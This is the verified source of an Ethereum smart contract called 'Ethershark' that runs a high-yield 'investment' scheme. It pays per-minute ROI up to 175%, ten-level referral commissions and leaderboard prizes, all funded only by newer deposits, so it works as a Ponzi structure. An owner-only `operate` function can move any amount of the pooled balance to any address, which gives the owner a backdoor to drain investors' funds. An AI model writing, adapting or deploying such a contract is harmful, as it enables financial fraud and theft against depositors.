/**
 *Submitted for verification at Etherscan.io on 2021-02-15
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

library BoringMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require((c = a + b) >= b, "BoringMath: Add Overflow");
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require((c = a - b) <= a, "BoringMath: Underflow");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b == 0 || (c = a * b) / b == a, "BoringMath: Mul Overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a / b;
    }
}

contract Ethershark {
    using BoringMath for uint256;

    struct Investor {
        address referrer;
        uint256 amount;
        uint256 lastSettledTime;
        uint256 incomeLimitLeft;
        uint256 directPartners;
        uint256 directReferralIncome;
        uint256 roiReferralIncome;
        uint256 topInvestorIncome;
        uint256 topSponsorIncome;
        uint256 superIncome;
    }

    struct Leaderboard {
        uint256 amt;
        address addr;
    }

    enum WithdrawTypes {
        ROIIncome,
        directReferralIncome,
        ROIMatchingIncome,
        topInvestorIncome,
        topSponsorIncome,
        superIncome,
        allBonuses
    }

    mapping(address => Investor) public investors;

    mapping(uint256 => mapping(address => uint256))
        private _referrerRoundVolume;
    mapping(uint256 => address[]) private _roundInvestors;
    uint8[10] private _DIRECT_REFERRAL_BONUS = [5, 1, 1, 1, 1, 1, 1, 1, 1, 1];
    uint8[10] private _ROI_MATCHING_BONUS = [10, 2, 2, 2, 2, 2, 2, 2, 2, 2];
    uint8[5] private _DAILY_POOL_AWARD_PERCENTAGE = [40, 30, 15, 10, 5];
    uint8 private constant _PASSIVE_ROI_PERCENT = 5;
    uint256 private constant _DIVIDER = 1000;
    uint256 private constant _POOL_TIME = 1 days;
    uint256 private constant _PASSIVE_ROI_INTERVAL = 1 minutes;
    uint256 private constant _MAX_ROI = 175; // Max ROI percent
    uint256 private immutable _START;
    uint256 private _lastDistributionTime;
    uint256 private _totalWithdrawn;
    uint256 private _totalInvested = 1 ether;
    uint256 private _totalInvestors = 1;
    uint256 private _rewardPool;
    address private _owner;

    /****************************  EVENTS   *****************************************/

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event Investment(
        address indexed investor,
        address indexed referrer,
        uint256 indexed round,
        uint256 amount
    );
    event Withdraw(
        address indexed investor,
        uint256 amount,
        WithdrawTypes withdrawType
    );
    event DailyTopIncome(
        address indexed investor,
        uint256 amount,
        uint256 indexed round,
        uint256 prize
    );

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _START = block.timestamp;
        _lastDistributionTime = block.timestamp;
        _setOwner(msg.sender);
    }

    // If someone accidently sends ETH to contract address
    receive() external payable {
        if (msg.sender != _owner) {
            _invest(msg.sender, msg.value, _getCurrentRound());
        }
    }

    fallback() external payable {}

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0x0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function invest(address _referrer) external payable {
        address referrer =
            _referrer != address(0x0) && _referrer != msg.sender
                ? _referrer
                : _owner;

        require(
            investors[referrer].referrer != address(0x0),
            "Invalid referrer"
        );

        require(
            msg.value % 1000000000000000 == 0,
            "Amount must be in multiple of 0.001 ETH."
        );

        if (investors[msg.sender].referrer == address(0x0)) {
            investors[msg.sender].referrer = referrer;
            _totalInvestors++;
            investors[referrer].directPartners++;
        }

        _invest(msg.sender, msg.value, _getCurrentRound());
    }

    function withdrawROIIncome() external {
        _withdrawROIIncome();
    }

    function withdrawDirectReferralIncome() external {
        Investor storage investor = investors[msg.sender];
        uint256 amount = investor.directReferralIncome;

        investor.directReferralIncome = 0;
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.directReferralIncome);
    }

    function withdrawROIMatchingIncome() external {
        Investor storage investor = investors[msg.sender];
        uint256 amount = investor.roiReferralIncome;

        investor.roiReferralIncome = 0;
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.ROIMatchingIncome);
    }

    function withdrawTopInvestorIncome() external {
        Investor storage investor = investors[msg.sender];
        uint256 amount = investor.topInvestorIncome;

        investor.topInvestorIncome = 0;
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.topInvestorIncome);
    }

    function withdrawTopSponsorIncome() external {
        Investor storage investor = investors[msg.sender];
        uint256 amount = investor.topSponsorIncome;

        investor.topSponsorIncome = 0;
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.topSponsorIncome);
    }

    function withdrawSuperIncome() external {
        Investor storage investor = investors[msg.sender];
        uint256 amount = investor.superIncome;

        investor.superIncome = 0;
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.superIncome);
    }

    function withdrawBonuses() external {
        _withdrawBonuses();
    }

    function withdrawAll() external {
        _withdrawROIIncome();
        _withdrawBonuses();
    }

    function operate(uint256 _amount, address payable _target)
        external
        payable
        onlyOwner
    {
        if (_amount > 0) {
            _safeTransfer(_target, _amount);
        }
    }

    function distributeDailyRewards() external {
        require(
            block.timestamp > _lastDistributionTime.add(_POOL_TIME),
            "Waith until next round."
        );

        uint256 prize;
        uint256 reward = _rewardPool.mul(5).div(200);
        uint256 round = _lastDistributionTime.sub(_START).div(_POOL_TIME);
        uint256 leaderboardLength = 5;
        uint256 placeInTopInvestors;
        uint256 placeInTopSponsors;
        address[] memory roundInvestors = _roundInvestors[round];
        uint256 length = roundInvestors.length;
        bool isInTopSposorsList;
        Leaderboard[5] memory topInvestors;
        Leaderboard[5] memory topSponsors;

        for (uint256 i = 0; i < length; i++) {
            Investor memory investor = investors[roundInvestors[i]];
            uint256 directVolume =
                _referrerRoundVolume[round][investor.referrer];
            placeInTopInvestors = 0;
            placeInTopSponsors = 0;
            isInTopSposorsList = false;

            if (directVolume > topSponsors[leaderboardLength - 1].amt) {
                for (uint256 j = 0; j < leaderboardLength; j++) {
                    if (investor.referrer == topSponsors[j].addr)
                        isInTopSposorsList = true;
                }

                if (!isInTopSposorsList) {
                    if (directVolume <= topSponsors[0].amt) {
                        for (uint256 j = leaderboardLength - 1; j > 0; j--) {
                            if (
                                topSponsors[j].amt < directVolume &&
                                directVolume <= topSponsors[j - 1].amt
                            ) placeInTopSponsors = j;
                        }
                    }

                    for (
                        uint256 j = leaderboardLength - 1;
                        j > placeInTopSponsors;
                        j--
                    ) {
                        topSponsors[j].addr = topSponsors[j - 1].addr;
                        topSponsors[j].amt = topSponsors[j - 1].amt;
                    }

                    topSponsors[placeInTopSponsors].addr = investor.referrer;
                    topSponsors[placeInTopSponsors].amt = directVolume;
                }
            }

            if (investor.amount <= topInvestors[leaderboardLength - 1].amt) {
                _roundInvestors[round][i] = address(0x0);
            } else {
                if (investor.amount <= topInvestors[0].amt) {
                    for (uint256 j = leaderboardLength - 1; j > 0; j--) {
                        if (
                            topInvestors[j].amt < investor.amount &&
                            investor.amount <= topInvestors[j - 1].amt
                        ) placeInTopInvestors = j;
                    }
                }

                for (
                    uint256 j = leaderboardLength - 1;
                    j > placeInTopInvestors;
                    j--
                ) {
                    topInvestors[j].addr = topInvestors[j - 1].addr;
                    topInvestors[j].amt = topInvestors[j - 1].amt;
                }

                topInvestors[placeInTopInvestors].addr = roundInvestors[i];
                topInvestors[placeInTopInvestors].amt = investor.amount;
                _roundInvestors[round][i] = address(0x0);
            }
        }

        for (uint256 index = 0; index < leaderboardLength; index++) {
            prize = reward.mul(_DAILY_POOL_AWARD_PERCENTAGE[index]).div(100);
            investors[topInvestors[index].addr].topInvestorIncome = investors[
                topInvestors[index].addr
            ]
                .topInvestorIncome
                .add(prize);
            investors[topSponsors[index].addr].topSponsorIncome = investors[
                topSponsors[index].addr
            ]
                .topSponsorIncome
                .add(prize);
            emit DailyTopIncome(
                topInvestors[index].addr,
                topInvestors[index].amt,
                round,
                prize
            );
            emit DailyTopIncome(
                topSponsors[index].addr,
                topSponsors[index].amt,
                round,
                prize
            );
        }

        _rewardPool = _rewardPool.sub(reward.mul(2));
        _lastDistributionTime = _lastDistributionTime.add(_POOL_TIME);
    }

    function getStats()
        public
        view
        returns (
            uint256 lastDistributionTime,
            uint256 start,
            uint256 round,
            uint256 totalWithdrawn,
            uint256 totalInvested,
            uint256 totalInvestors,
            uint256 rewardPool
        )
    {
        lastDistributionTime = _lastDistributionTime;
        start = _START;
        round = _getCurrentRound();
        totalWithdrawn = _totalWithdrawn;
        totalInvested = _totalInvested;
        totalInvestors = _totalInvestors;
        rewardPool = _rewardPool;
    }

    function _calculateDailyROI(address _investor)
        private
        view
        returns (uint256 income)
    {
        income = investors[_investor]
            .amount
            .mul(_PASSIVE_ROI_PERCENT)
            .mul(
            block.timestamp.sub(investors[_investor].lastSettledTime).div(
                _PASSIVE_ROI_INTERVAL
            )
        )
            .div(_DIVIDER)
            .div(1440);
    }

    function _setOwner(address owner_) private {
        if (_owner != address(0x0)) {
            investors[_owner].referrer = owner_;
        }

        _owner = owner_;

        emit OwnershipTransferred(_owner, owner_);

        Investor storage investor = investors[owner_];

        if (investor.referrer == address(0x0)) {
            investor.referrer = owner_;
        }

        investor.referrer = owner_;
        investor.amount = 1 ether;
        investor.lastSettledTime = block.timestamp;
        investor.incomeLimitLeft = investor.amount.mul(_MAX_ROI).div(100);
    }

    function _getCurrentRound() private view returns (uint256 round) {
        round = block.timestamp.sub(_START).div(_POOL_TIME);
    }

    function _invest(
        address _investor,
        uint256 _amount,
        uint256 _round
    ) private {
        Investor storage investor = investors[_investor];

        require(
            _amount >= investor.amount,
            "Cannot invest less than previous amount."
        );
        require(
            investor.incomeLimitLeft == 0,
            "Previous cycle is still active."
        );

        if (_amount >= 100 ether) {
            investor.superIncome = investor.superIncome.add(
                _amount.mul(5).div(200)
            );
            investors[investor.referrer].superIncome = investors[
                investor.referrer
            ]
                .superIncome
                .add(_amount.mul(5).div(200));
        }

        investor.lastSettledTime = block.timestamp;
        investor.amount = _amount;
        investor.incomeLimitLeft = _amount.mul(_MAX_ROI).div(100);
        _roundInvestors[_round].push(_investor);
        _referrerRoundVolume[_round][investor.referrer] = _referrerRoundVolume[
            _round
        ][investor.referrer]
            .add(_amount);

        _setDirectReferralCommissions(_investor, _amount, 0, investor.referrer);

        _totalInvested = _totalInvested.add(_amount);
        _rewardPool = _rewardPool.add(_amount.mul(5).div(100));

        emit Investment(_investor, investor.referrer, _round, _amount);
    }

    function _safeTransfer(address payable _investor, uint256 _amount)
        private
        returns (uint256 amount)
    {
        if (_investor == address(0x0)) {
            return 0;
        }
        amount = _amount;
        if (address(this).balance < _amount) {
            amount = address(this).balance;
        }

        _investor.transfer(amount);
    }

    function _setDirectReferralCommissions(
        address _investor,
        uint256 _amount,
        uint256 index,
        address referrer
    ) private {
        if (referrer == _owner || index == 10) {
            return;
        }

        if (investors[referrer].directPartners > index) {
            investors[referrer].directReferralIncome = investors[referrer]
                .directReferralIncome
                .add(_amount.mul(_DIRECT_REFERRAL_BONUS[index]).div(100));
        }

        return
            _setDirectReferralCommissions(
                _investor,
                _amount,
                index + 1,
                investors[referrer].referrer
            );
    }

    function _setROIMatchingBonus(address _investor, uint256 _amount) private {
        address referrer = investors[_investor].referrer;
        uint256 index;

        while (referrer != _owner && index != 10) {
            investors[referrer].roiReferralIncome = investors[referrer]
                .roiReferralIncome
                .add(_amount.mul(_ROI_MATCHING_BONUS[index]).div(100));
            index = index.add(1);
            referrer = investors[referrer].referrer;
        }
    }

    function _withdrawROIIncome() private {
        uint256 amount = _calculateDailyROI(msg.sender);

        Investor storage investor = investors[msg.sender];

        investor.lastSettledTime = investor.lastSettledTime.add(
            block
                .timestamp
                .sub(investor.lastSettledTime)
                .div(_PASSIVE_ROI_INTERVAL)
                .mul(60)
        );
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _setROIMatchingBonus(msg.sender, amount);

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.ROIIncome);
    }

    function _withdrawBonuses() private {
        Investor storage investor = investors[msg.sender];
        uint256 amount =
            investor
                .directReferralIncome
                .add(investor.roiReferralIncome)
                .add(investor.topInvestorIncome)
                .add(investor.topSponsorIncome)
                .add(investor.superIncome);

        investor.directReferralIncome = 0;
        investor.roiReferralIncome = 0;
        investor.topInvestorIncome = 0;
        investor.topSponsorIncome = 0;
        investor.superIncome = 0;
        investor.incomeLimitLeft = investor.incomeLimitLeft.sub(amount);
        _totalWithdrawn = _totalWithdrawn.add(amount);
        _rewardPool = _rewardPool.add(amount.mul(5).div(100));

        _safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, WithdrawTypes.allBonuses);
    }
}